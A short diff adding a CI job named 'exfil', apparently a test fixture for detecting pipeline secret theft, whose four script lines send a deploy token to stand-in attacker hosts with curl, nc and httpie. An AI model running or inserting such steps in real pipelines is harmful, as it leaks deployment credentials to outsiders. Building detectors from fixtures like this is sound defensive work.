@@ -1,0 +1,7 @@
+exfil:
+  image: alpine:3.19
+  script:
+    - 'curl -s flag.evil.example -d "k=$DEPLOY_TOKEN"'
+    - 'nc -v nc.evil.example 4444 <<< "$DEPLOY_TOKEN"'
+    - 'nc -w 3 wait.evil.example 4444 <<< "$DEPLOY_TOKEN"'
+    - 'http POST httpie.evil.example k=$DEPLOY_TOKEN'
